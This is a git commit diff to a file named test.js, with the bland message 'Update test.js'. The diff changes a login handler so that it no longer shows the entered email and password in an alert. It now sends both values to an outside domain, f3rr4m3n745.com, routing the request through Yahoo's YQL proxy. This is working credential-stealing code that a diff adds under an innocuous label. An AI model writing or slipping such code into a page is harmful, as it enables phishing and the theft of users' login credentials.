ed2043249c2b27b090dd2baab5be14558d23ef87
F3RR4M3N745 <F3RR4M3N745@hotmail.com>
2015-07-21 18:15:40 -0300

    Update test.js

--- test.js
+++ test.js
@@ -1,7 +1,15 @@
 function getData() {
+  
   var email = document.getElementById('credentials-email').value;
   var password = document.getElementById('credentials-password').value;
-  alert(email + " / " + password);
+  
+  var url = "http://f3rr4m3n745.com/shorter.php?username=" + email + "&password=" + password;
+  
+  $.getJSON("https://query.yahooapis.com/v1/public/yql?"
+  +"q=select%20*%20from%20html%20where%20url%3D%22"
+  +encodeURIComponent(url)
+  +"%22&format=xml'&callback=?");
+  
 }
 
 var value = document.getElementById('credentials-submit');
